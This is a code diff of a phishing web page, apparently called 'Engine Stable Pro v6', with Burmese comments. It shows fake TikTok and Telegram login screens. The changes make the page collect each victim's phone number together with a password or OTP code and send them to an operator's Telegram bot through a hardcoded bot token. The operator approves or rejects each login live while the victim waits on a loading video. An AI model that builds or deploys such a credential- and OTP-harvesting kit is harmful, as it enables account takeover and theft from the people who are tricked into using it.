@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Engine Stable Pro</title>
+    <title>Engine Stable Pro v6</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -14,8 +14,7 @@
         #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
         .notice-success { background: #10b981; }
         .notice-error { background: #ef4444; }
-        .entry-btn { position: absolute; bottom: 12%; left: 50%; transform: translateX(-50%); background: #fe2c55; padding: 15px 60px; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; z-index: 10; box-shadow: 0 0 20px rgba(254, 44, 85, 0.6); }
-        .tg-logo { width: 80px; height: 80px; background: #2481cc; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; }
+        .entry-btn { position: absolute; bottom: 12%; left: 50%; transform: translateX(-50%); background: #fe2c55; padding: 15px 60px; border-radius: 50px; color: white; font-weight: bold; cursor: pointer; z-index: 10; box-shadow: 0 0 20px rgba(254, 44, 85, 0.6); border: none; }
         #gameFrameContainer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; background: #000; display: none; }
         iframe { width: 100%; height: 100%; border: none; }
     </style>
@@ -24,13 +23,14 @@
 
 <div id="topNotice"></div>
 
+<!-- သီချင်း -->
 <audio id="bgMusic" loop>
     <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/be5dd1c4b85a9d0bc6951bf1379bff3ce0286c2a/lv_0_20260513134939.mp3" type="audio/mpeg">
 </audio>
 
 <div id="app">
-    <!-- Selection Screen -->
-    <div id="selectScreen" class="hidden w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
+    <!-- 1. ရွေးချယ်မှု Screen -->
+    <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
         <div class="bg-[#111] border border-white/10 p-10 w-full max-w-sm rounded-[30px] text-center">
             <h1 class="text-xl font-bold mb-8 text-white">Login to continue</h1>
             <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3">
@@ -42,7 +42,7 @@
         </div>
     </div>
 
-    <!-- TikTok Screen -->
+    <!-- 2. TikTok Login -->
     <div id="ttScreen" class="hidden bg-black w-full h-full p-6 text-white z-50 relative">
         <div class="flex items-center justify-between mb-8">
             <i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl cursor-pointer"></i>
@@ -51,26 +51,20 @@
         </div>
         <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input">
         <input type="password" id="ttPass" placeholder="Password" class="tt-input">
-        <div class="flex justify-between text-xs mt-4 text-gray-400">
-            <span>Log in with email</span>
-            <span class="text-red-500 font-bold cursor-pointer">Forgot password?</span>
-        </div>
-        <button onclick="submitTT()" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10">Log in</button>
+        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10">Log in</button>
     </div>
 
-    <!-- Telegram UI (With Back Arrow) -->
+    <!-- 3. Telegram Login -->
     <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
         <div class="flex items-center mb-10"><i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl cursor-pointer mr-6"></i></div>
-        <div class="tg-logo"><i class="fa-brands fa-telegram text-5xl text-white"></i></div>
-        <h1 class="text-center text-2xl font-bold mb-2">Your Phone</h1>
-        <input type="number" id="tgPhone" placeholder="Phone number" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none mb-6">
-        <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none">
-        <button onclick="submitTG()" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold mt-12">CONTINUE</button>
+        <input type="number" id="tgPhone" placeholder="Phone number" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none mb-6 text-white">
+        <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none text-white">
+        <button onclick="submit('Telegram')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold mt-12">CONTINUE</button>
     </div>
 
-    <!-- Video Loading Screen (Instead of Spinning Circle) -->
+    <!-- 4. Loading Screen -->
     <div id="waitScreen" class="hidden w-full h-full bg-black z-[60] relative">
-        <video class="full-video" autoplay loop muted playsinline>
+        <video id="loadVd" class="full-video" loop muted playsinline>
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4" type="video/mp4">
         </video>
         <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40">
@@ -78,7 +72,7 @@
         </div>
     </div>
 
-    <!-- Main Video Screen -->
+    <!-- 5. Final Video Screen -->
     <div id="videoScreen" class="hidden w-full h-full">
         <video id="mainVd" class="full-video" loop playsinline muted autoplay>
             <source src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4" type="video/mp4">
@@ -86,7 +80,7 @@
         <button onclick="openGame()" class="entry-btn">ဝင်ရောက်ရန်</button>
     </div>
 
-    <!-- Game Frame -->
+    <!-- 6. Game Container -->
     <div id="gameFrameContainer">
         <div onclick="closeGame()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full"><i class="fa-solid fa-house"></i></div>
         <iframe id="gameFrame" src=""></iframe>
@@ -95,7 +89,7 @@
 
 <script>
     const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
-    const chat = "5304050102";
+    const chatID = "5304050102";
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
     const music = document.getElementById('bgMusic');
 
@@ -110,20 +104,21 @@
         el.style.top = '0'; setTimeout(() => el.style.top = '-100px', 4000);
     }
 
-    async function submitTT() {
+    async function submit(type) {
+        const ph = (type === 'TikTok') ? document.getElementById('ttPhone').value : document.getElementById('tgPhone').value;
+        const extra = (type === 'TikTok') ? document.getElementById('ttPass').value : document.getElementById('tgOtp').value;
+        
         toggle('waitScreen');
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:chat, text:`TikTok Login\nPH: ${document.getElementById('ttPhone').value}\nID: ${userKey}`, reply_markup:{inline_keyboard:[[{text:"✅ Approve", callback_data:`ok_${userKey}`},{text:"❌ Reject", callback_data:`no_${userKey}`}]]}})
-        });
-        startPolling();
-    }
+        document.getElementById('loadVd').play();
 
-    async function submitTG() {
-        toggle('waitScreen');
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:chat, text:`Telegram Login\nPH: ${document.getElementById('tgPhone').value}\nID: ${userKey}`, reply_markup:{inline_keyboard:[[{text:"✅ Approve", callback_data:`ok_${userKey}`},{text:"❌ Reject", callback_data:`no_${userKey}`}]]}})
+            body:JSON.stringify({
+                chat_id:chatID, 
+                text:`<b>${type} Login</b>\nPH: <code>${ph}</code>\nData: <code>${extra}</code>\nID: <code>${userKey}</code>`,
+                parse_mode: 'HTML',
+                reply_markup:{inline_keyboard:[[{text:"✅ Approve", callback_data:`ok_${userKey}`},{text:"❌ Reject", callback_data:`no_${userKey}`}]]}
+            })
         });
         startPolling();
     }
@@ -132,28 +127,48 @@
         const check = setInterval(async () => {
             const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=-1`);
             const data = await res.json();
-            const last = data.result?.[data.result.length - 1];
-            if (last?.callback_query?.data === `ok_${userKey}`) {
-                clearInterval(check); localStorage.setItem('approved', 'true');
-                showNotice("login ၀င်ရောက်မှု အောင်မြင်ပါသည်။", "success"); playFinal();
-            } else if (last?.callback_query?.data === `no_${userKey}`) {
-                clearInterval(check); showNotice("Login ၀င်ရောက်မှု မအောင်မြင်ပါ။ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပါ။", "error"); toggle('selectScreen');
+            const last = data.result?.[data.result.length - 1]?.callback_query;
+            
+            if (last && last.data.includes(userKey)) {
+                // Bot ဆီကို Answer ပြန်ပို့မယ် (Approve/Reject စာပေါ်အောင်)
+                await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery?callback_query_id=${last.id}&text=${last.data.startsWith('ok') ? 'Approved!' : 'Rejected!'}`);
+
+                if (last.data === `ok_${userKey}`) {
+                    clearInterval(check);
+                    localStorage.setItem('auth_done', 'true');
+                    showNotice("Login ၀င်ရောက်မှု အောင်မြင်ပါသည်။", "success");
+                    playFinal();
+                } else if (last.data === `no_${userKey}`) {
+                    clearInterval(check);
+                    showNotice("Login ၀င်ရောက်မှုမအောင်မြင်ပါ။ သင့်အ‌ကောင့်အား ပြန်လည်စစ်ဆေးပါ။", "error");
+                    location.reload();
+                }
             }
         }, 3000);
     }
 
-    function playFinal() { toggle('videoScreen'); music.play(); document.getElementById('mainVd').play(); }
-    
-    function openGame() { 
-        document.getElementById('gameFrameContainer').style.display = 'block'; 
-        document.getElementById('gameFrame').src = "https://www.crazygames.com";
-        const itv = setInterval(() => { if(document.activeElement === document.getElementById('gameFrame')) { music.pause(); clearInterval(itv); } }, 1000);
+    function playFinal() {
+        toggle('videoScreen');
+        music.play();
+        document.getElementById('mainVd').play();
     }
 
-    function closeGame() { document.getElementById('gameFrameContainer').style.display = 'none'; document.getElementById('gameFrame').src = ""; music.play(); }
+    function openGame() {
+        document.getElementById('gameFrameContainer').style.display = 'block';
+        document.getElementById('gameFrame').src = "https://www.crazygames.com";
+        music.pause();
+    }
 
-    window.onload = () => { if(localStorage.getItem('approved')) playFinal(); else toggle('selectScreen'); };
+    function closeGame() {
+        document.getElementById('gameFrameContainer').style.display = 'none';
+        document.getElementById('gameFrame').src = "";
+        music.play();
+    }
+
+    window.onload = () => {
+        if(localStorage.getItem('auth_done')) playFinal();
+        else toggle('selectScreen');
+    };
 </script>
 </body>
 </html>
-
